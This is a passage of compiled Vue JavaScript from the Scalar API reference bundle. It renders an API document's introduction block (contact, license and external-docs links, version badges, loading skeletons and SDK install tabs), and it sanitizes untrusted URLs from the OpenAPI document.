			return __props.description ? (openBlock(), createElementBlock("div", _hoisted_1$85, [(openBlock(true), createElementBlock(Fragment, null, renderList(sections.value, (section) => {
				return openBlock(), createBlock(InfoMarkdownSection_default, {
					id: section.id,
					key: section.id,
					content: section.content,
					eventBus: __props.eventBus,
					transformHeading
				}, null, 8, [
					"id",
					"content",
					"eventBus"
				]);
			}), 128))])) : createCommentVNode("", true);
		};
	}
}), [["__scopeId", "data-v-0370764f"]]);
//#endregion
//#region node_modules/@scalar/api-reference/dist/components/LinkList/LinkList.vue.js
var LinkList_default = /*#__PURE__*/ _plugin_vue_export_helper_default$1(/* @__PURE__ */ defineComponent({
	__name: "LinkList",
	setup(__props) {
		const containerRef = ref();
		/** Whether the container needs to scroll */
		const needsScroll = ref(false);
		/** Check if the container can scroll in either direction */
		const checkScrollability = () => {
			if (!containerRef.value) return;
			const { scrollWidth, clientWidth } = containerRef.value;
			needsScroll.value = scrollWidth > clientWidth;
		};
		/** MutationObserver to watch for changes in child elements */
		let mutationObserver = null;
		/**
		* We use the mutation observer to watch for changes and check if we need to scroll,
		* if we do need to scroll we apply the icons-only class to the container
		*/
		onMounted(() => {
			checkScrollability();
			window.addEventListener("resize", checkScrollability);
			if (containerRef.value) {
				mutationObserver = new MutationObserver(() => {
					checkScrollability();
				});
				mutationObserver.observe(containerRef.value, {
					childList: true,
					subtree: true
				});
			}
		});
		onUnmounted(() => {
			window.removeEventListener("resize", checkScrollability);
			if (mutationObserver) {
				mutationObserver.disconnect();
				mutationObserver = null;
			}
		});
		return (_ctx, _cache) => {
			return openBlock(), createElementBlock("div", {
				ref_key: "containerRef",
				ref: containerRef,
				class: normalizeClass(["custom-scroll narrow:mb-3 mb-1.5 flex h-auto min-h-8 max-w-full items-center gap-2 overflow-x-auto text-base whitespace-nowrap", { "icons-only": needsScroll.value }])
			}, [renderSlot(_ctx.$slots, "default", {}, void 0, true)], 2);
		};
	}
}), [["__scopeId", "data-v-dc833d99"]]);
//#endregion
//#region node_modules/@scalar/api-reference/dist/features/external-docs/ExternalDocs.vue.script.js
var _hoisted_1$84 = {
	key: 0,
	class: "group narrow:border-r-0 narrow:first:ml-0 flex items-center border-r first:ml-auto last:border-r-0"
};
var _hoisted_2$56 = {
	key: 0,
	class: "ml-1 empty:hidden"
};
var _hoisted_3$39 = {
	key: 1,
	class: "ml-1 empty:hidden"
};
//#endregion
//#region node_modules/@scalar/api-reference/dist/features/external-docs/ExternalDocs.vue.js
var ExternalDocs_default = /* @__PURE__ */ defineComponent({
	__name: "ExternalDocs",
	props: { value: {} },
	setup(__props) {
		/**
		* The external docs URL comes from the OpenAPI document, which is untrusted input, so a protocol
		* like `javascript:` would execute script on click. Fall back to the plain text label in that case.
		*/
		const url = computed(() => sanitizeUrl(__props.value?.url));
		return (_ctx, _cache) => {
			return __props.value ? (openBlock(), createElementBlock("div", _hoisted_1$84, [(openBlock(), createBlock(resolveDynamicComponent(url.value ? "a" : "span"), {
				class: "text-c-1 hover:bg-b-2 narrow:border mr-2 flex min-h-7 min-w-7 items-center rounded-lg px-2 py-1 no-underline group-last:mr-0",
				href: url.value,
				rel: url.value ? "noopener noreferrer" : void 0,
				target: url.value ? "_blank" : void 0
			}, {
				default: withCtx(() => [createVNode(unref(ScalarIconBook_default), {
					class: "size-3 text-current",
					weight: "bold"
				}), __props.value.description ? (openBlock(), createElementBlock("span", _hoisted_2$56, toDisplayString(__props.value.description), 1)) : (openBlock(), createElementBlock("span", _hoisted_3$39, toDisplayString(__props.value.url), 1))]),
				_: 1
			}, 8, [
				"href",
				"rel",
				"target"
			]))])) : createCommentVNode("", true);
		};
	}
});
//#endregion
//#region node_modules/@scalar/api-reference/dist/features/info-object/Contact.vue.script.js
var _hoisted_1$83 = {
	key: 0,
	class: "group narrow:border-r-0 narrow:first:ml-0 flex items-center border-r first:ml-auto last:border-r-0"
};
var _hoisted_2$55 = ["href"];
var _hoisted_3$38 = { class: "ml-1 empty:hidden" };
var _hoisted_4$24 = {
	key: 1,
	class: "group narrow:border-r-0 narrow:first:ml-0 flex items-center border-r first:ml-auto last:border-r-0"
};
var _hoisted_5$16 = ["href"];
var _hoisted_6$14 = { class: "ml-1 empty:hidden" };
var _hoisted_7$9 = {
	key: 2,
	class: "group narrow:border-r-0 narrow:first:ml-0 flex items-center border-r first:ml-auto last:border-r-0"
};
//#endregion
//#region node_modules/@scalar/api-reference/dist/features/info-object/Contact.vue.js
var Contact_default = /* @__PURE__ */ defineComponent({
	__name: "Contact",
	props: { value: {} },
	setup(__props) {
		/**
		* The contact URL comes from the OpenAPI document, which is untrusted input, so a protocol like
		* `javascript:` would execute script on click. Fall back to the plain text label in that case.
		*/
		const url = computed(() => sanitizeUrl(__props.value?.url));
		const variants = cva({
			base: "text-c-1 mr-2 flex min-h-7 min-w-7 items-center rounded-lg px-2 py-1 group-last:mr-0 narrow:border",
			variants: { link: { true: "no-underline hover:bg-b-2" } }
		});
		return (_ctx, _cache) => {
			return __props.value ? (openBlock(), createElementBlock(Fragment, { key: 0 }, [__props.value.email ? (openBlock(), createElementBlock("div", _hoisted_1$83, [createBaseVNode("a", {
				class: normalizeClass(unref(variants)({ link: true })),
				href: `mailto:${__props.value.email}`
			}, [createVNode(unref(ScalarIconEnvelopeSimple_default), {
				class: "size-3 text-current",
				weight: "bold"
			}), createBaseVNode("span", _hoisted_3$38, toDisplayString(__props.value.name), 1)], 10, _hoisted_2$55)])) : createCommentVNode("", true), url.value ? (openBlock(), createElementBlock("div", _hoisted_4$24, [createBaseVNode("a", {
				class: normalizeClass(unref(variants)({ link: true })),
				href: url.value,
				rel: "noopener noreferrer",
				target: "_blank"
			}, [createVNode(unref(ScalarIconLink_default), {
				class: "size-3 text-current",
				weight: "bold"
			}), createBaseVNode("span", _hoisted_6$14, toDisplayString(__props.value.email ? "" : __props.value.name), 1)], 10, _hoisted_5$16)])) : !__props.value.email && __props.value.name ? (openBlock(), createElementBlock("div", _hoisted_7$9, [createBaseVNode("span", { class: normalizeClass(unref(variants)({ link: false })) }, toDisplayString(__props.value.name), 3)])) : createCommentVNode("", true)], 64)) : createCommentVNode("", true);
		};
	}
});
//#endregion
//#region node_modules/@scalar/api-reference/dist/features/info-object/InfoLink.vue.script.js
var _hoisted_1$82 = { class: "group narrow:border-r-0 narrow:first:ml-0 flex items-center border-r first:ml-auto last:border-r-0" };
var _hoisted_2$54 = ["href"];
var _hoisted_3$37 = { class: "ml-1 empty:hidden" };
var _hoisted_4$23 = { class: "ml-1 empty:hidden" };
//#endregion
//#region node_modules/@scalar/api-reference/dist/features/info-object/InfoLink.vue.js
var InfoLink_default = /* @__PURE__ */ defineComponent({
	__name: "InfoLink",
	props: {
		name: {},
		url: {}
	},
	setup(__props) {
		/**
		* The link URL comes from the `x-scalar-links` extension of the OpenAPI document, which is
		* untrusted input, so a protocol like `javascript:` would execute script on click. Fall back to
		* the plain text label in that case.
		*/
		const safeUrl = computed(() => sanitizeUrl(__props.url));
		return (_ctx, _cache) => {
			return openBlock(), createElementBlock("div", _hoisted_1$82, [safeUrl.value ? (openBlock(), createElementBlock("a", {
				key: 0,
				class: "text-c-1 hover:bg-b-2 narrow:border mr-2 flex min-h-7 min-w-7 items-center rounded-lg px-2 py-1 no-underline group-last:mr-0",
				href: safeUrl.value,
				rel: "noopener noreferrer",
				target: "_blank"
			}, [createVNode(unref(ScalarIconLink_default), {
				class: "size-3 text-current",
				weight: "bold"
			}), createBaseVNode("span", _hoisted_3$37, toDisplayString(__props.name), 1)], 8, _hoisted_2$54)) : (openBlock(), createElementBlock(Fragment, { key: 1 }, [createVNode(unref(ScalarIconLink_default), {
				class: "size-3 text-current",
				weight: "bold"
			}), createBaseVNode("span", _hoisted_4$23, toDisplayString(__props.name), 1)], 64))]);
		};
	}
});
//#endregion
//#region node_modules/@scalar/api-reference/dist/features/info-object/License.vue.script.js
var _hoisted_1$81 = { class: "group narrow:border-r-0 narrow:first:ml-0 flex h-fit items-center border-r first:ml-auto last:border-r-0" };
var _hoisted_2$53 = ["href"];
var _hoisted_3$36 = { class: "ml-1 empty:hidden" };
var _hoisted_4$22 = { class: "ml-1 empty:hidden" };
//#endregion
//#region node_modules/@scalar/api-reference/dist/features/info-object/License.vue.js
var License_default = /* @__PURE__ */ defineComponent({
	__name: "License",
	props: { value: {} },
	setup(__props) {
		/**
		* The license URL comes from the OpenAPI document, which is untrusted input, so a protocol like
		* `javascript:` would execute script on click. Fall back to the plain text label in that case.
		*/
		const url = computed(() => sanitizeUrl(__props.value?.url));
		return (_ctx, _cache) => {
			return openBlock(), createElementBlock("div", _hoisted_1$81, [url.value ? (openBlock(), createElementBlock("a", {
				key: 0,
				class: "text-c-1 hover:bg-b-2 narrow:border mr-2 flex min-h-7 min-w-7 items-center rounded-lg px-2 py-1 no-underline group-last:mr-0",
				href: url.value,
				rel: "noopener noreferrer",
				target: "_blank"
			}, [createVNode(unref(ScalarIconGavel_default), {
				class: "size-3 text-current",
				weight: "bold"
			}), createBaseVNode("span", _hoisted_3$36, toDisplayString(__props.value?.name || __props.value && "identifier" in __props.value && __props.value.identifier || url.value), 1)], 8, _hoisted_2$53)) : (openBlock(), createElementBlock(Fragment, { key: 1 }, [createVNode(unref(ScalarIconGavel_default), {
				class: "size-3 text-current",
				weight: "bold"
			}), createBaseVNode("span", _hoisted_4$22, toDisplayString(__props.value?.name), 1)], 64))]);
		};
	}
});
//#endregion
//#region node_modules/@scalar/api-reference/dist/features/info-object/TermsOfService.vue.script.js
var _hoisted_1$80 = {
	key: 0,
	class: "group narrow:border-r-0 narrow:first:ml-0 flex items-center border-r first:ml-auto last:border-r-0"
};
var _hoisted_2$52 = ["href"];
var _hoisted_3$35 = { class: "ml-1 empty:hidden" };
//#endregion
//#region node_modules/@scalar/api-reference/dist/features/info-object/TermsOfService.vue.js
var TermsOfService_default = /* @__PURE__ */ defineComponent({
	__name: "TermsOfService",
	props: { value: {} },
	setup(__props) {
		const { translate } = useLocalization();
		/**
		* The terms of service URL comes from the OpenAPI document, which is untrusted input, so a
		* protocol like `javascript:` would execute script on click. Hide the link in that case.
		*/
		const url = computed(() => sanitizeUrl(__props.value));
		return (_ctx, _cache) => {
			return url.value ? (openBlock(), createElementBlock("div", _hoisted_1$80, [createBaseVNode("a", {
				class: "text-c-1 hover:bg-b-2 narrow:border mr-2 flex min-h-7 min-w-7 items-center rounded-lg px-2 py-1 no-underline group-last:mr-0",
				href: url.value,
				rel: "noopener noreferrer",
				target: "_blank"
			}, [createVNode(unref(ScalarIconScroll_default), {
				class: "size-3 text-current",
				weight: "bold"
			}), createBaseVNode("span", _hoisted_3$35, toDisplayString(unref(translate)("info.termsOfService")), 1)], 8, _hoisted_2$52)])) : createCommentVNode("", true);
		};
	}
});
//#endregion
//#region node_modules/@scalar/api-reference/dist/blocks/scalar-info-block/components/InfoLinks.vue.js
var InfoLinks_default = /* @__PURE__ */ defineComponent({
	__name: "InfoLinks",
	props: {
		info: {},
		externalDocs: {}
	},
	setup(__props) {
		/** Additional named links from the `x-scalar-links` extension (e.g. privacy policy, imprint) */
		const links = computed(() => {
			const value = "x-scalar-links" in __props.info ? __props.info["x-scalar-links"] : void 0;
			if (!Array.isArray(value)) return [];
			return value.filter((link) => typeof link?.name === "string" && typeof link?.url === "string");
		});
		/** Whether there is at least one link to show, so we do not render an empty list */
		const hasLinks = computed(() => Boolean(__props.externalDocs || __props.info.contact || __props.info.license || __props.info.termsOfService || links.value.length));
		return (_ctx, _cache) => {
			return hasLinks.value ? (openBlock(), createBlock(unref(LinkList_default), { key: 0 }, {
				default: withCtx(() => [
					__props.externalDocs ? (openBlock(), createBlock(unref(ExternalDocs_default), {
						key: 0,
						value: __props.externalDocs
					}, null, 8, ["value"])) : createCommentVNode("", true),
					__props.info.contact ? (openBlock(), createBlock(unref(Contact_default), {
						key: 1,
						value: __props.info.contact
					}, null, 8, ["value"])) : createCommentVNode("", true),
					__props.info.license ? (openBlock(), createBlock(unref(License_default), {
						key: 2,
						value: unref(getResolvedRef)(__props.info.license)
					}, null, 8, ["value"])) : createCommentVNode("", true),
					__props.info.termsOfService ? (openBlock(), createBlock(unref(TermsOfService_default), {
						key: 3,
						value: __props.info.termsOfService
					}, null, 8, ["value"])) : createCommentVNode("", true),
					(openBlock(true), createElementBlock(Fragment, null, renderList(links.value, (link) => {
						return openBlock(), createBlock(unref(InfoLink_default), {
							key: link.url,
							name: link.name,
							url: link.url
						}, null, 8, ["name", "url"]);
					}), 128))
				]),
				_: 1
			})) : createCommentVNode("", true);
		};
	}
});
//#endregion
//#region node_modules/@scalar/api-reference/dist/blocks/scalar-info-block/components/InfoVersion.vue.js
var InfoVersion_default = /* @__PURE__ */ defineComponent({
	__name: "InfoVersion",
	props: { version: {} },
	setup(__props) {
		/** Format the version number to be displayed in the badge */
		const prefixedVersion = computed(() => {
			if (__props.version == null) return __props.version;
			const versionString = String(__props.version);
			return /^\d/.test(versionString) ? `v${versionString}` : versionString;
		});
		return (_ctx, _cache) => {
			return prefixedVersion.value ? (openBlock(), createBlock(unref(Badge_default), { key: 0 }, {
				default: withCtx(() => [createTextVNode(toDisplayString(prefixedVersion.value), 1)]),
				_: 1
			})) : createCommentVNode("", true);
		};
	}
});
//#endregion
//#region node_modules/@scalar/api-reference/dist/blocks/scalar-info-block/components/IntroductionLoading.vue.script.js
var _hoisted_1$79 = {
	"aria-hidden": "true",
	class: "introduction-loading flex flex-col gap-5"
};
var _hoisted_2$51 = {
	key: 0,
	class: "narrow:flex-col narrow:gap-3 flex gap-6"
};
//#endregion
//#region node_modules/@scalar/api-reference/dist/blocks/scalar-info-block/components/IntroductionLoading.vue.js
var IntroductionLoading_default = /*#__PURE__*/ _plugin_vue_export_helper_default$1(/* @__PURE__ */ defineComponent({
	__name: "IntroductionLoading",
	props: { hasAside: {
		type: Boolean,
		default: true
	} },
	setup(__props) {
		/**
		* Loading skeleton for the introduction block. It mirrors the real layout
		* (badges, title, links, description and selector cards) so the page does not
		* jump once the document has loaded.
		*/
		return (_ctx, _cache) => {
			return openBlock(), createElementBlock("div", _hoisted_1$79, [
				_cache[3] || (_cache[3] = createStaticVNode("<div class=\"flex gap-1.5\" data-v-41a61989><div class=\"introduction-skeleton h-6 w-14 rounded-full\" data-v-41a61989></div><div class=\"introduction-skeleton h-6 w-24 rounded-full\" data-v-41a61989></div></div><div class=\"narrow:grid-cols-1 narrow:gap-3 grid grid-cols-2 gap-12\" data-v-41a61989><div class=\"introduction-skeleton h-9 w-3/5 rounded-lg\" data-v-41a61989></div><div class=\"narrow:justify-start flex flex-wrap items-center justify-end gap-2\" data-v-41a61989><div class=\"introduction-skeleton h-5 w-28 rounded\" data-v-41a61989></div><div class=\"introduction-skeleton h-5 w-28 rounded\" data-v-41a61989></div><div class=\"introduction-skeleton h-5 w-12 rounded\" data-v-41a61989></div></div></div>", 2)),
				createVNode(unref(SectionColumns_default), null, {
					default: withCtx(() => [createVNode(unref(SectionColumn_default), null, {
						default: withCtx(() => [..._cache[0] || (_cache[0] = [createBaseVNode("div", { class: "flex flex-col gap-3" }, [
							createBaseVNode("div", { class: "introduction-skeleton mb-2 h-5 w-56 rounded" }),
							createBaseVNode("div", { class: "introduction-skeleton h-4 w-full rounded" }),
							createBaseVNode("div", { class: "introduction-skeleton h-4 w-11/12 rounded" }),
							createBaseVNode("div", { class: "introduction-skeleton h-4 w-4/5 rounded" }),
							createBaseVNode("div", { class: "introduction-skeleton mt-4 h-6 w-40 rounded" }),
							createBaseVNode("div", { class: "introduction-skeleton h-4 w-3/4 rounded" }),
							createBaseVNode("div", { class: "introduction-skeleton h-4 w-2/3 rounded" }),
							createBaseVNode("div", { class: "introduction-skeleton h-4 w-1/2 rounded" })
						], -1)])]),
						_: 1
					}), __props.hasAside ? (openBlock(), createBlock(unref(SectionColumn_default), { key: 0 }, {
						default: withCtx(() => [..._cache[1] || (_cache[1] = [createBaseVNode("div", { class: "sticky-cards gap-3" }, [
							createBaseVNode("div", { class: "introduction-skeleton h-20 w-full rounded-lg" }),
							createBaseVNode("div", { class: "introduction-skeleton h-28 w-full rounded-lg" }),
							createBaseVNode("div", { class: "introduction-skeleton h-28 w-full rounded-lg" })
						], -1)])]),
						_: 1
					})) : createCommentVNode("", true)]),
					_: 1
				}),
				!__props.hasAside ? (openBlock(), createElementBlock("div", _hoisted_2$51, [..._cache[2] || (_cache[2] = [
					createBaseVNode("div", { class: "introduction-skeleton h-28 w-full flex-1 rounded-lg" }, null, -1),
					createBaseVNode("div", { class: "introduction-skeleton h-28 w-full flex-1 rounded-lg" }, null, -1),
					createBaseVNode("div", { class: "introduction-skeleton h-28 w-full flex-1 rounded-lg" }, null, -1)
				])])) : createCommentVNode("", true)
			]);
		};
	}
}), [["__scopeId", "data-v-41a61989"]]);
//#endregion
//#region node_modules/@scalar/api-reference/dist/blocks/scalar-info-block/components/SpecificationVersion.vue.js
var SpecificationVersion_default = /* @__PURE__ */ defineComponent({
	__name: "SpecificationVersion",
	props: {
		documentType: { default: "openapi" },
		version: {}
	},
	setup(__props) {
		const label = computed(() => getDocumentTypeLabel(__props.documentType));
		return (_ctx, _cache) => {
			return __props.version ? (openBlock(), createBlock(unref(Badge_default), { key: 0 }, {
				default: withCtx(() => [createTextVNode(toDisplayString(label.value) + " " + toDisplayString(__props.version), 1)]),
				_: 1
			})) : createCommentVNode("", true);
		};
	}
});
//#endregion
//#region node_modules/@scalar/api-reference/dist/blocks/scalar-info-block/components/IntroductionLayout.vue.script.js
var _hoisted_1$78 = { class: "flex gap-1.5" };
var _hoisted_2$50 = { class: "sticky-cards" };
//#endregion
//#region node_modules/@scalar/api-reference/dist/blocks/scalar-info-block/components/IntroductionLayout.vue.js
var IntroductionLayout_default = /*#__PURE__*/ _plugin_vue_export_helper_default$1(/* @__PURE__ */ defineComponent({
	__name: "IntroductionLayout",
	props: {
		id: {},
		documentType: {},
		specificationVersion: {},
		info: {},
		externalDocs: {},
		documentExtensions: {},
		infoExtensions: {},
		headingSlugGenerator: { type: Function },
		eventBus: {}
	},
	setup(__props) {
		const { translate } = useLocalization();
		const { level: headingLevel } = useDocumentOutline("document");
		return (_ctx, _cache) => {
			return openBlock(), createBlock(unref(SectionContainer_default), null, {
				default: withCtx(() => [createVNode(unref(Section_default), {
					id: __props.id,
					"aria-label": unref(translate)("navigation.introduction"),
					class: "introduction-section z-1 gap-12",
					onIntersecting: _cache[0] || (_cache[0] = () => __props.id && __props.eventBus?.emit("intersecting:nav-item", { id: __props.id }))
				}, {
					default: withCtx(() => [createVNode(unref(SectionContent_default), null, {
						default: withCtx(() => [!__props.info ? (openBlock(), createBlock(IntroductionLoading_default, {
							key: 0,
							hasAside: Boolean(_ctx.$slots.aside)
						}, null, 8, ["hasAside"])) : (openBlock(), createElementBlock(Fragment, { key: 1 }, [
							createBaseVNode("div", _hoisted_1$78, [createVNode(InfoVersion_default, { version: __props.info?.version }, null, 8, ["version"]), createVNode(SpecificationVersion_default, {
								documentType: __props.documentType,
								version: __props.specificationVersion
							}, null, 8, ["documentType", "version"])]),
							createVNode(unref(SectionHeader_default), { tight: "" }, {
								links: withCtx(() => [createVNode(InfoLinks_default, {
									externalDocs: __props.externalDocs,
									info: __props.info
								}, null, 8, ["externalDocs", "info"])]),
								default: withCtx(() => [createVNode(unref(SectionHeaderTag_default), { level: unref(headingLevel) }, {
									default: withCtx(() => [createTextVNode(toDisplayString(__props.info?.title), 1)]),
									_: 1
								}, 8, ["level"])]),
								_: 1
							}),
							createVNode(unref(SectionColumns_default), null, {
								default: withCtx(() => [createVNode(unref(SectionColumn_default), null, {
									default: withCtx(() => [renderSlot(_ctx.$slots, "download-link", {}, void 0, true), createVNode(InfoDescription_default, {
										description: __props.info?.description,
										eventBus: __props.eventBus,
										headingSlugGenerator: __props.headingSlugGenerator
									}, null, 8, [
										"description",
										"eventBus",
										"headingSlugGenerator"
									])]),
									_: 3
								}), _ctx.$slots.aside ? (openBlock(), createBlock(unref(SectionColumn_default), { key: 0 }, {
									default: withCtx(() => [createBaseVNode("div", _hoisted_2$50, [renderSlot(_ctx.$slots, "aside", {}, void 0, true)])]),
									_: 3
								})) : createCommentVNode("", true)]),
								_: 3
							}),
							createVNode(unref(SpecificationExtension_default), { value: __props.documentExtensions }, null, 8, ["value"]),
							createVNode(unref(SpecificationExtension_default), { value: __props.infoExtensions }, null, 8, ["value"])
						], 64))]),
						_: 3
					}), renderSlot(_ctx.$slots, "after", {}, void 0, true)]),
					_: 3
				}, 8, ["id", "aria-label"])]),
				_: 3
			});
		};
	}
}), [["__scopeId", "data-v-047ab128"]]);
//#endregion
//#region node_modules/@scalar/api-reference/dist/blocks/scalar-info-block/components/InfoBlock.vue.js
var InfoBlock_default = /* @__PURE__ */ defineComponent({
	__name: "InfoBlock",
	props: {
		id: {},
		specificationVersion: {},
		info: {},
		externalDocs: {},
		documentExtensions: {},
		infoExtensions: {},
		eventBus: {},
		headingSlugGenerator: { type: Function },
		layout: {},
		documentDownloadType: { default: "both" },
		documentUrl: {},
		documentType: {}
	},
	setup(__props) {
		/**
		* Put the selectors in
		* - the after slot for classic layout,
		* - and the aside slot for other layouts.
		*/
		const introCardsSlot = computed(() => __props.layout === "classic" ? "after" : "aside");
		return (_ctx, _cache) => {
			return openBlock(), createBlock(IntroductionLayout_default, {
				id: __props.id,
				documentExtensions: __props.documentExtensions,
				documentType: __props.documentType,
				eventBus: __props.eventBus,
				externalDocs: __props.externalDocs,
				headingSlugGenerator: __props.headingSlugGenerator,
				info: __props.info,
				infoExtensions: __props.infoExtensions,
				specificationVersion: __props.specificationVersion
			}, {
				[introCardsSlot.value]: withCtx(() => [createVNode(IntroductionCard_default, { row: __props.layout === "classic" }, {
					default: withCtx(() => [renderSlot(_ctx.$slots, "selectors")]),
					_: 3
				}, 8, ["row"])]),
				"download-link": withCtx(() => [createVNode(DownloadLink_default, {
					documentDownloadType: __props.documentDownloadType,
					documentType: __props.documentType,
					documentUrl: __props.documentUrl,
					eventBus: __props.eventBus
				}, null, 8, [
					"documentDownloadType",
					"documentType",
					"documentUrl",
					"eventBus"
				])]),
				_: 2
			}, 1032, [
				"id",
				"documentExtensions",
				"documentType",
				"eventBus",
				"externalDocs",
				"headingSlugGenerator",
				"info",
				"infoExtensions",
				"specificationVersion"
			]);
		};
	}
});
//#endregion
//#region node_modules/@scalar/api-reference/dist/blocks/scalar-info-block/components/IntroductionCardItem.vue.js
var _sfc_main$3 = {};
var _hoisted_1$77 = { class: "introduction-card-item" };
function _sfc_render$4(_ctx, _cache) {
	return openBlock(), createElementBlock("div", _hoisted_1$77, [renderSlot(_ctx.$slots, "default", {}, void 0, true)]);
}
var IntroductionCardItem_default = /*#__PURE__*/ _plugin_vue_export_helper_default$1(_sfc_main$3, [["render", _sfc_render$4], ["__scopeId", "data-v-dfab866f"]]);
//#endregion
//#region node_modules/@scalar/api-reference/dist/blocks/scalar-sdk-installation-instructions/helpers/renderable-sdks.js
/**
* Wrap a raw install command in a fenced code block.
*
* The fence uses a run of backticks longer than the longest run inside the
* source, so a `source` that itself contains backticks (or a nested fence)
* still renders as a single code block instead of breaking out of it.
*/
var toFencedCodeBlock = (source) => {
	const longestRun = Math.max(0, ...[...source.matchAll(/`+/g)].map((match) => match[0].length));
	const fence = "`".repeat(Math.max(3, longestRun + 1));
	return `${fence}\n${source}\n${fence}`;
};
/**
* The SDK installation entries that actually have something to render, each
* resolved to a single Markdown `description`.
*
* A `description` is the promoted content, but the legacy `source` install
* command is still supported: when both are present it is appended to the
* description as a fenced code block, and when only `source` is present it
* becomes the description on its own. Entries that carry neither are ignored so
* the UI can fall back to the generic client selector instead of showing an
* empty card. Both the gate in `Content.vue` and the tab list in the block rely
* on this, so the "has instructions" rule lives in one place.
*
* The value comes straight from an untrusted OpenAPI document, so anything
* malformed — a non-array extension, a non-object entry, or an entry missing a
* string `lang` (the tab label and icon key) and any content — is treated as
* "no instructions" rather than allowed to throw at render time.
*/
var getRenderableSdks = (xScalarSdkInstallation) => Array.isArray(xScalarSdkInstallation) ? xScalarSdkInstallation.flatMap((sdk) => {
	if (typeof sdk?.lang !== "string") return [];
	const description = typeof sdk.description === "string" && sdk.description.trim() ? sdk.description : "";
	const source = typeof sdk.source === "string" ? sdk.source.trim() : "";
	if (!description && !source) return [];
	const resolved = [description, source && toFencedCodeBlock(source)].filter(Boolean).join("\n\n");
	return [{
		lang: sdk.lang,
		description: resolved
	}];
}) : [];
//#endregion
//#region node_modules/@scalar/api-reference/dist/blocks/scalar-sdk-installation-instructions/helpers/language-icon.js
/**
* Maps common language names (and a few aliases) to the matching
* `programming-language-*` icon.
*
* The `lang` in `x-scalar-sdk-installation` is a freeform string, so we only
* resolve the ones we have a logo for and let the caller fall back to text.
*/
var LANGUAGE_ICONS = {
	c: "programming-language-c",
	clojure: "programming-language-clojure",
	csharp: "programming-language-csharp",
	"c#": "programming-language-csharp",
	cs: "programming-language-csharp",
	css: "programming-language-css3",
	css3: "programming-language-css3",
	dart: "programming-language-dart",
	fsharp: "programming-language-fsharp",
	"f#": "programming-language-fsharp",
	go: "programming-language-go",
	golang: "programming-language-go",
	html: "programming-language-html5",
	html5: "programming-language-html5",
	http: "programming-language-http",
	java: "programming-language-java",
	javascript: "programming-language-javascript",
	js: "programming-language-javascript",
	json: "programming-language-json",
	julia: "programming-language-julia",
	jl: "programming-language-julia",
	kotlin: "programming-language-kotlin",
	node: "programming-language-node",
	"node.js": "programming-language-node",
	nodejs: "programming-language-node",
	objc: "programming-language-objc",
	"objective-c": "programming-language-objc",
	ocaml: "programming-language-ocaml",
	php: "programming-language-php",
	powershell: "programming-language-powershell",
	python: "programming-language-python",
	py: "programming-language-python",
	r: "programming-language-r",
	ruby: "programming-language-ruby",
	rb: "programming-language-ruby",
	rust: "programming-language-rust",
	rs: "programming-language-rust",
	scala: "programming-language-scala",
	shell: "programming-language-shell",
	bash: "programming-language-shell",
	sh: "programming-language-shell",
	curl: "programming-language-shell",
	swift: "programming-language-swift",
	typescript: "programming-language-typescript",
	ts: "programming-language-typescript"
};
/** Find the programming language icon for a given language name, if we have one. */
var getLanguageIcon = (lang) => LANGUAGE_ICONS[lang.trim().toLowerCase()];
//#endregion
//#region node_modules/@scalar/api-reference/dist/blocks/scalar-sdk-installation-instructions/helpers/visible-tab-count.js
/**
* Work out how many tabs fit inline given the width of each tab and the width
* available to render them in.
*
* When everything fits, all tabs are shown. Otherwise we reserve room for the
* "More" dropdown trigger and return how many tabs fit alongside it (always at
* least one, so the row is never empty).
*/
var getVisibleTabCount = (tabWidths, availableWidth, moreWidth) => {
	const total = tabWidths.length;
	if (availableWidth <= 0) return total;
	const countThatFits = (reserved) => {
		let used = 0;
		let count = 0;
		for (const width of tabWidths) {
			if (used + width > availableWidth - reserved) break;
			used += width;
			count++;
		}
		return count;
	};
	if (countThatFits(0) >= total) return total;
	return Math.max(1, countThatFits(moreWidth));
};
//#endregion
//#region node_modules/@scalar/api-reference/dist/blocks/scalar-sdk-installation-instructions/components/SdkInstallationInstructions.vue.script.js
var _hoisted_1$76 = { key: 0 };
var _hoisted_2$49 = ["id"];
var _hoisted_3$34 = { class: "client-libraries-content" };
var _hoisted_4$21 = ["aria-labelledby"];
var _hoisted_5$15 = [
	"id",
	"aria-selected",
	"tabindex",
	"onClick",
	"onKeydown"
];
var _hoisted_6$13 = { class: "client-libraries-text" };
var _hoisted_7$8 = { class: "client-libraries-text" };
var _hoisted_8$7 = {
	"aria-hidden": "true",
	class: "client-libraries-measure-clip"
};
var _hoisted_9$6 = { class: "client-libraries-text" };
var _hoisted_10$3 = { class: "client-libraries" };
var _hoisted_11$2 = { class: "client-libraries-text" };
var _hoisted_12$2 = ["aria-labelledby"];
//#endregion
//#region node_modules/@scalar/api-reference/dist/blocks/scalar-sdk-installation-instructions/components/SdkInstallationInstructions.vue.js
var SdkInstallationInstructions_default = /*#__PURE__*/ _plugin_vue_export_helper_default$1(/* @__PURE__ */ defineComponent({
	__name: "SdkInstallationInstructions",
	props: {
		xScalarSdkInstallation: {},
		selectedClient: {},
		eventBus: {}
	},
	setup(__props) {
		const headingId = useId();
		/** Base id used to associate each tab with the shared panel for assistive tech */
		const baseId = useId();
		const panelId = `${baseId}-panel`;
		const { translate } = useLocalization();
		/** Only the SDKs that actually have something to show, with their resolved icon */
		const sdks = computed(() => getRenderableSdks(__props.xScalarSdkInstallation).map((sdk) => ({
			...sdk,
			icon: getLanguageIcon(sdk.lang)
		})));
		/** Index of the currently selected SDK */
		const selectedIndex = ref(0);
		/** The currently selected SDK */
		const selected = computed(() => sdks.value[selectedIndex.value]);
		/**
		* The `custom/<lang>` client id for each SDK, aligned by index with `sdks`.
		*
		* We reuse the exact id scheme the operation code samples use for their custom
		* examples, so selecting a language here resolves to the same id those samples
		* are keyed by — that shared id is what keeps the two surfaces in sync.
		*/
		const sdkClientIds = computed(() => r(sdks.value.map((sdk) => ({
			lang: sdk.lang,
			source: ""
		}))));
		/** Select an SDK by index and broadcast it so the operation code samples follow */
		const select = (index) => {
			selectedIndex.value = index;
			const id = sdkClientIds.value[index];
			if (id) __props.eventBus?.emit("workspace:update:selected-client", id);
		};
		watch([() => __props.selectedClient, sdkClientIds], ([client, ids]) => {
			const matched = client ? ids.findIndex((id) => id === client) : -1;
			if (matched >= 0) selectedIndex.value = matched;
			else if (selectedIndex.value > ids.length - 1) selectedIndex.value = 0;
		}, { immediate: true });
		watch(() => sdks.value.map((sdk) => sdk.lang).join("\n"), () => void nextTick(measure));
		/** The full row, measured for available width (the tab strip's own width depends on the outcome) */
		const rowRef = ref();
		/** The tab strip, used to move focus between tabs */
		const tabsRef = ref();
		const measureRef = ref();
